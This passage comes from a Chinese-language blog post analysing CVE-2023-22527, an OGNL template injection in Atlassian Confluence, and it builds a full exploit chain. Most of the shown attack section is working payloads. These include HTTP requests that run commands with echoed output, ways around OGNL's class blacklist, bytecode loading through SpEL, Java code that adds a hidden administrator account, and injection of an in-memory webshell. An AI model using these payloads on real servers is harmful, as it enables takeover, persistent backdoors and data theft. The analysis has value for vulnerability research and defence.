<p><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092441988.png" alt="image-20240307092441988"></p>
</li>
<li><p>invoke</p>
</li>
</ul>
<p><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092452639.png" alt="image-20240307092452639"></p>
<ul>
<li>模板中的漏洞点 <code>$stack.findValue</code></li>
</ul>
<p><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092504970.png" alt="image-20240307092504970"></p>
<ul>
<li>触发 Ognl 表达式解析</li>
</ul>
<p><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092517172.png" alt="image-20240307092517172"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">getValueUsingOgnl</span><span class="params">(String expr)</span> <span class="keyword">throws</span> OgnlException </span>&#123;</span><br><span class="line">    Object var2;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        var2 = <span class="keyword">this</span>.ognlUtil.getValue(expr, <span class="keyword">this</span>.context, <span class="keyword">this</span>.root);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.context.remove(THROW_EXCEPTION_ON_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> var2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>两个 findValue 不一样，<br>第一次是<br><code>$stack.findValue()</code>获取的是<code>OgnlValueStack</code><br>在 findValue() -&gt; <code>getValueUsingOgnl</code> 测试表达式执行<br><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092529936.png" alt="image-20240307092529936"><br>这里不能使用 <code>$&#123;&#125;</code>包裹，可以使用<code>#&#123;&#125;</code><br><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092539244.png" alt="image-20240307092539244"><br>第二次是<br><code>#request.get(&#39;.KEY_velocity.struts2.context&#39;).internalGet(&#39;ognl&#39;)</code>获取的是OgnlTool</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa<span class="string">&#x27;+#request.get(&#x27;</span>.KEY_velocity.struts2.context<span class="string">&#x27;).internalGet(&#x27;</span>ognl<span class="string">&#x27;).findValue(#parameters.poc[0],&#123;&#125;)+&#x27;</span>&amp;poc=xxxx</span><br></pre></td></tr></table></figure>
<p><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092556068.png" alt="image-20240307092556068"></p>
<h3 id="3-2-RCE"><a href="#3-2-RCE" class="headerlink" title="3.2 RCE"></a>3.2 RCE</h3><p>上面已经找到了 Ongl 表达式注入的地方，但是还不能直接RCE，参考链接[2]<br>在 [2] 中有一个列表</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">For Freemarker:</span><br><span class="line"></span><br><span class="line">.freemarker.Request (freemarker.ext.servlet.HttpRequestHashModel)</span><br><span class="line">.freemarker.TemplateModel (org.apache.struts2.views.freemarker.ScopesHashModel)</span><br><span class="line">__FreeMarkerServlet.Application__ (freemarker.ext.servlet.ServletContextHashModel)</span><br><span class="line">JspTaglibs (freemarker.ext.jsp.TaglibFactory)</span><br><span class="line">.freemarker.RequestParameters (freemarker.ext.servlet.HttpRequestParametersHashModel)</span><br><span class="line">.freemarker.Request (freemarker.ext.servlet.HttpRequestHashModel)</span><br><span class="line">.freemarker.Application (freemarker.ext.servlet.ServletContextHashModel)</span><br><span class="line">.freemarker.JspTaglibs (freemarker.ext.jsp.TaglibFactory)</span><br><span class="line">ognl (org.apache.struts2.views.jsp.ui.OgnlTool)</span><br><span class="line">stack (com.opensymphony.xwork2.ognl.OgnlValueStack)</span><br><span class="line">struts (org.apache.struts2.util.StrutsUtil)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">For JSPs:</span><br><span class="line"></span><br><span class="line">com.opensymphony.xwork2.dispatcher.PageContext (PageContextImpl)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">For Velocity:</span><br><span class="line"></span><br><span class="line">.KEY_velocity.struts2.context -&gt; (StrutsVelocityContext)</span><br><span class="line">ognl (org.apache.struts2.views.jsp.ui.OgnlTool)</span><br><span class="line">struts (org.apache.struts2.views.velocity.result.VelocityStrutsUtils)</span><br></pre></td></tr></table></figure>
<p>引用[2]<br><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307093308942.png" alt="image-20240307093308942"><br><code>OgnlTool#findValue</code>二次加载 <code>Ognl</code> 表达式<br><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092615933.png" alt="image-20240307092615933"></p>
<blockquote>
<p>这里查看堆栈，有个<code>OgnlRuntime#invokeMethodInsideSandbox</code>方法引起注入，可会思考 <code>Ognl</code> 的加固方案</p>
</blockquote>
<p><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092625167.png" alt="image-20240307092625167"></p>
<h2 id="4-EXP"><a href="#4-EXP" class="headerlink" title="4. EXP"></a>4. EXP</h2><p>测试的 ognl 表达式如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@org</span>.apache. struts2.ServletActionContext<span class="meta">@getResponse()</span>.setHeader(<span class="string">&#x27;Cmd-Responses-Header&#x27;</span>,(<span class="keyword">new</span> freemarker.template.utility.Execute()).exec(&#123;<span class="string">&quot;id&quot;</span>&#125;))</span><br></pre></td></tr></table></figure>
<p>获取 <code>HttpServletResponse</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> HttpServletResponse <span class="title">getResponse</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (HttpServletResponse)ActionContext.getContext().get(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092635746.png" alt="image-20240307092635746"></p>
<h3 id="4-1-命令执行拦截"><a href="#4-1-命令执行拦截" class="headerlink" title="4.1. 命令执行拦截"></a>4.1. 命令执行拦截</h3><p>但是当我使用传统的命令执行表达式时，触发安全拦截</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime()</span>.exec(<span class="string">&#x27;touch /tmp/1.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092646368.png" alt="image-20240307092646368"></p>
<ul>
<li>子节点 getValue</li>
</ul>
<p><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092658143.png" alt="image-20240307092658143"></p>
<ul>
<li>反射调用方法的代码段</li>
</ul>
<p><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092707896.png" alt="image-20240307092707896"></p>
<ul>
<li>安全拦截</li>
</ul>
<p>可以看到这里做了一些限制，其中就禁用了一些黑名单类，比如 <code>ClassResolver</code>、<code>ClassLoader</code>、<code>ProcessBuilder</code>、<code>Runtime</code>等</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (_useStricterInvocation) &#123;</span><br><span class="line">    Class methodDeclaringClass = method.getDeclaringClass();</span><br><span class="line">    <span class="keyword">if</span> (AO_SETACCESSIBLE_REF != <span class="keyword">null</span> &amp;&amp; AO_SETACCESSIBLE_REF.equals(method) || AO_SETACCESSIBLE_ARR_REF != <span class="keyword">null</span> &amp;&amp; AO_SETACCESSIBLE_ARR_REF.equals(method) || SYS_EXIT_REF != <span class="keyword">null</span> &amp;&amp; SYS_EXIT_REF.equals(method) || SYS_CONSOLE_REF != <span class="keyword">null</span> &amp;&amp; SYS_CONSOLE_REF.equals(method) || AccessibleObjectHandler.class.isAssignableFrom(methodDeclaringClass) || ClassResolver.class.isAssignableFrom(methodDeclaringClass) || MethodAccessor.class.isAssignableFrom(methodDeclaringClass) || MemberAccess.class.isAssignableFrom(methodDeclaringClass) || OgnlContext.class.isAssignableFrom(methodDeclaringClass) || Runtime.class.isAssignableFrom(methodDeclaringClass) || ClassLoader.class.isAssignableFrom(methodDeclaringClass) || ProcessBuilder.class.isAssignableFrom(methodDeclaringClass) || AccessibleObjectHandlerJDK9Plus.unsafeOrDescendant(methodDeclaringClass)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalAccessException(<span class="string">&quot;Method [&quot;</span> + method + <span class="string">&quot;] cannot be called from within OGNL invokeMethod() &quot;</span> + <span class="string">&quot;under stricter invocation mode.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092718021.png" alt="image-20240307092718021"><br>这个限制默认开启<br><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092755873.png" alt="image-20240307092755873"></p>
<h3 id="4-2-绕过黑名单限制"><a href="#4-2-绕过黑名单限制" class="headerlink" title="4.2. 绕过黑名单限制"></a>4.2. 绕过黑名单限制</h3><p>Poc 中使用 freemarker 的命令执行进行绕过，绕过黑名单即可</p>
<ul>
<li>freemarker</li>
<li>ScriptEngineManager</li>
<li>groovy</li>
</ul>
<p><code>freemarker</code> 命令执行<br><code>freemarker.template.utility.Execute()</code><br><code>ScriptEngineManager</code></p>
<h3 id="4-3-回显"><a href="#4-3-回显" class="headerlink" title="4.3. 回显"></a>4.3. 回显</h3><p>！直接构造回显， Poc回显会触发长度限制</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> javax.script.ScriptEngineManager().getEngineByName(<span class="string">&#x27;js&#x27;</span>).eval(<span class="string">&#x27;java.lang.Runtime.getRuntime().exec(&quot;var c=com.atlassian.core.filters.ServletContextThreadLocal.getRequest().getHeader(&#x27;</span>Token<span class="string">&#x27;);var x=java.lang.Runtime.getRuntime().exec(c);var out=com.atlassian.core.filters.ServletContextThreadLocal.getResponse().getOutputStream();org.apache.commons.io.IOUtils.copy(x.getInputStream(),out);out.flush();out.close();&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092806193.png" alt="image-20240307092806193"><br>抛出长度限制的异常，最长的长度只能是 200<br><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092815918.png" alt="image-20240307092815918"><br>思路：通过 <code>Request</code> 参数传递 JS<br><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307093400959.png" alt="image-20240307093400959"></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/template/aui/text-inline.vm</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8090</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>603</span><br><span class="line"><span class="attribute">Token</span><span class="punctuation">: </span>whoami</span><br><span class="line"></span><br><span class="line">label=aaa\u0027%2b#request.get(\u0027.KEY_velocity.struts2.context\u0027).internalGet(\u0027ognl\u0027).findValue(#parameters.og[0],&#123;&#125;)%2b\u0027&amp;og=new javax.script.ScriptEngineManager().getEngineByName(&#x27;js&#x27;).eval(@org.apache.struts2.ServletActionContext@getRequest().getParameter(&#x27;js&#x27;))&amp;js=var c=com.atlassian.core.filters.ServletContextThreadLocal.getRequest().getHeader(&#x27;Token&#x27;);var x=java.lang.Runtime.getRuntime().exec(c);var out=com.atlassian.core.filters.ServletContextThreadLocal.getResponse().getOutputStream();org.apache.commons.io.IOUtils.copy(x.getInputStream(),out);out.flush();out.close();</span><br></pre></td></tr></table></figure>
<p>内存马嵌套<code>ScriptEngineManager</code>内存马即可，集成到插件</p>
<h3 id="4-4-添加管理员失败及绕过思路"><a href="#4-4-添加管理员失败及绕过思路" class="headerlink" title="4.4. 添加管理员失败及绕过思路"></a>4.4. 添加管理员失败及绕过思路</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">label=aaa\u0027%2b#request.get(\u0027.KEY_velocity.struts2.context\u0027).internalGet(\u0027ognl\u0027).findValue(#parameters.og[0],&#123;&#125;)%2b\u0027&amp;og=@com.atlassian.confluence.util.GeneralUtil@getUserAccessor().addUser(&#x27;HWatlassian&#x27;,&#x27;atlassian&#x27;,&#x27;admin@atlassian.com&#x27;,&#x27;atlassian&#x27;)</span><br></pre></td></tr></table></figure>
<p>使用这个 Poc（没有配置所属管理员组），已经报错了，提示没有权限；<strong>看来已经修复了这个利用方式</strong><br><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092833894.png" alt="image-20240307092833894"><br>查看<code>com/atlassian/confluence/user/DefaultUserAccessor.class#createUser</code>，方法中已经添加了<strong>用户身份校验；且其他用户有关方法都添加了权限校验</strong><br><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092848609.png" alt="image-20240307092848609"><br>但是这个方法并不是最终添加用户的方法，因此绕过上面的权限校验的代码段就可以，考虑可以直接使用 <code>this.getUserManager().createUser()</code><br><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092910464.png" alt="image-20240307092910464"><br>构造了这样的代码，发送测试，发现并不行</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/template/aui/text-inline.vm</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8090</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>427</span><br><span class="line"></span><br><span class="line">label=aaa\u0027%2b#request.get(\u0027.KEY_velocity.struts2.context\u0027).internalGet(\u0027ognl\u0027).findValue(#parameters.og[0],&#123;&#125;)%2b\u0027&amp;og=(#a=@com.atlassian.confluence.util.GeneralUtil@getUserAccessor()).(#b=new com.atlassian.user.impl.DefaultUser(&quot;atlassian1&quot;, &quot;atlassian1&quot;, &quot;admin@atlassian.com&quot;)).(#c=@com.atlassian.user.security.password.Credential@unencrypted(&quot;1qaz@WSX&quot;)).(#a.getUserManager().createUser(#b,#c))</span><br></pre></td></tr></table></figure>
<p><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092921491.png" alt="image-20240307092921491"><br>报错显示，无法获取 <code>getUserManager</code> 方法<br><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092933765.png" alt="image-20240307092933765"><br>因为获取的是代理类，不能转换为 <code>DefaultUserAccessor</code>，不能使用继承类的方法<br><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092944601.png" alt="image-20240307092944601"><br>可以看到是从 Spring 容器中获取的 <code>userAccessor</code>；<br>这里正好找到 userAccessorTarget，可以通过 <code>DefaultUserAccessor dua = (DefaultUserAccessor)ContainerManager.getComponent(&quot;userAccessorTarget&quot;);</code>获取对应的 bean 对象<br><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307092955327.png" alt="image-20240307092955327"></p>
<p>通过各种构造，但是 js 这种弱语言构造问题太多，前置类型转换就存在问题，因此考虑还是直接加载字节码更灵活一些</p>
<h3 id="4-5-加载字节码"><a href="#4-5-加载字节码" class="headerlink" title="4.5. 加载字节码"></a>4.5. 加载字节码</h3><p>正常情况下，通过如下代码就可以实现</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> bytes = org.apache.tomcat.util.codec.binary.Base64.decodeBase64(<span class="string">&#x27;&#123;replace&#125;&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> classLoader = java.lang.Thread.currentThread().getContextClassLoader();</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> clazz = classLoader.loadClass(<span class="string">&#x27;&#123;replace&#125;&#x27;</span>);</span><br><span class="line">    clazz.newInstance();</span><br><span class="line">&#125;<span class="keyword">catch</span>(err)&#123;</span><br><span class="line">    <span class="keyword">var</span> method = java.lang.ClassLoader.class.getDeclaredMethod(<span class="string">&#x27;defineClass&#x27;</span>, <span class="string">&#x27;&#x27;</span>.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);</span><br><span class="line">    method.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">var</span> clazz = method.invoke(classLoader, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">    clazz.newInstance();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="4-5-1-JDK9以上的一些限制"><a href="#4-5-1-JDK9以上的一些限制" class="headerlink" title="4.5.1 JDK9以上的一些限制"></a>4.5.1 JDK9以上的一些限制</h4><p>**这里又遇到了问题，由于confluence 测试的这个版本运行在 openjdk11 上，JDK9后的高版本 JDK 加入了模块化设计，无法直接在 js 代码中调用 **<code>java.lang</code><strong>；这里我尝试了使用</strong><code>&quot;&quot;.getClass().getClassLoader().getClass()xxxx</code>**来测试，发现 JDK9 后也取消了 **<code>Object.getClass()</code><strong>方法</strong><br><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307093005381.png" alt="image-20240307093005381"><br>基于这种情况，只能换一种方式来加载字节码了，好在 confluence 中加载的组件较多，于是测试结合 SpEL 表达式来实现字节码的加载<br>先测试一下命令执行的字节码，加载字节码成功</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">label=aaa\u0027%2b#request.get(\u0027.KEY_velocity.struts2.context\u0027).internalGet(\u0027ognl\u0027).findValue(#parameters.og[0],&#123;&#125;)%2b\u0027&amp;og=new org.springframework.expression.spel.standard.SpelExpressionParser().parseExpression(@org.apache.struts2.ServletActionContext@getRequest().getParameter(&#x27;spel&#x27;)).getValue()&amp;spel=T(org.springframework.cglib.core.ReflectUtils).defineClass(&#x27;bytecode.addUser&#x27;,T(org.springframework.util.Base64Utils).decodeFromString(&#x27;base64Classxxxxxxxxxxxx&#x27;),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).newInstance()</span><br></pre></td></tr></table></figure>
<p><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307093052624.png" alt="image-20240307093052624"></p>
<h3 id="4-6-使用类加载实现添加管理员和内存马"><a href="#4-6-使用类加载实现添加管理员和内存马" class="headerlink" title="4.6. 使用类加载实现添加管理员和内存马"></a>4.6. 使用类加载实现添加管理员和内存马</h3><p>构造一下添加管理员的思路的利用链</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">DefaultUserAccessor dua = (DefaultUserAccessor)ContainerManager.getComponent(<span class="string">&quot;userAccessorTarget&quot;</span>);</span><br><span class="line">DefaultUser defaultUser = <span class="keyword">new</span> DefaultUser(<span class="string">&quot;atlassian5&quot;</span>, <span class="string">&quot;atlassian5&quot;</span>, <span class="string">&quot;a5@atlassian5.com&quot;</span>);</span><br><span class="line">Credential credential = Credential.unencrypted(<span class="string">&quot;1qaz@WSX&quot;</span>);</span><br><span class="line">Method method1 = bucket.user.DefaultUserAccessor.class.getDeclaredMethod(<span class="string">&quot;getUserManager&quot;</span>);</span><br><span class="line">method1.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">UserManager getUserManager = (UserManager) method1.invoke(dua);</span><br><span class="line">User user = getUserManager.createUser(defaultUser, credential);</span><br><span class="line">Group group = dua.getGroup(<span class="string">&quot;confluence-administrators&quot;</span>);</span><br><span class="line">Method method2 =  bucket.user.DefaultUserAccessor.class.getDeclaredMethod(<span class="string">&quot;getGroupManager&quot;</span>);</span><br><span class="line">method2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">GroupManager groupManager = (GroupManager) method2.invoke(dua);</span><br><span class="line">groupManager.addMembership(group,user);</span><br></pre></td></tr></table></figure>

<ul>
<li>测试添加管理员成功</li>
</ul>
<p><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307093111575.png" alt="image-20240307093111575"></p>
<ul>
<li>内存马的话，由于字节码加载已经解决，直接使用 tomcat 的内存马测试，但是又遇到了异常，<strong>报错显示 SpEL 表达式过长，大于 10000 个字符</strong></li>
</ul>
<p><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307093128794.png" alt="image-20240307093128794"><br>解决内存马注入问题：继续分解 SpEL 表达式的长度</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">label=aaa\u0027%2b#request.get(\u0027.KEY_velocity.struts2.context\u0027).internalGet(\u0027ognl\u0027).findValue(#parameters.og[0],&#123;&#125;)%2b\u0027&amp;og=new org.springframework.expression.spel.standard.SpelExpressionParser().parseExpression(@org.apache.struts2.ServletActionContext@getRequest().getParameter(&#x27;spel&#x27;)).getValue()&amp;spel=T(org.springframework.cglib.core.ReflectUtils).defineClass(&#x27;bytecode.tomcat&#x27;,T(org.springframework.util.Base64Utils).decodeFromString(T(org.apache.struts2.ServletActionContext).getRequest().getParameter(&#x27;code&#x27;)),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).newInstance()&amp;code=yv66vgAAAD.........</span><br></pre></td></tr></table></figure>
<p><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307093200943.png" alt="image-20240307093200943"></p>
<hr>
<p>后面又发现 <code>github</code> 有个项目发布注入内存马：<a target="_blank" rel="noopener" href="https://github.com/Boogipop/CVE-2023-22527-Godzilla-MEMSHEL%EF%BC%8C%E8%80%8C%E4%B8%94%E6%80%9D%E8%B7%AF%E5%BE%88%E5%A5%BD">https://github.com/Boogipop/CVE-2023-22527-Godzilla-MEMSHEL，而且思路很好</a></p>
<ul>
<li>他这里先发送一个请求使用 <code>@ognl.Ognl@applyExpressionMaxLength(100000)</code>把<code>Ognl</code> 表达式长度限制修改掉</li>
<li>然后再发送一个请求，直接在 Ognl 表达式中使用<code>org.springframework.cglib.core.ReflectUtils</code> 加载内存马</li>
</ul>
<p><img src="/img/CVE-2023-22527-confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0/image-20240307093212186.png" alt="image-20240307093212186"></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/search/">搜索</a></li>
         
          <li><a href="/categories/">分类</a></li>
         
          <li><a href="/tags/">标签</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="/link">链接</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
         
          <li><a href="/about/">关于</a></li>
        
      </ul>
    </div>

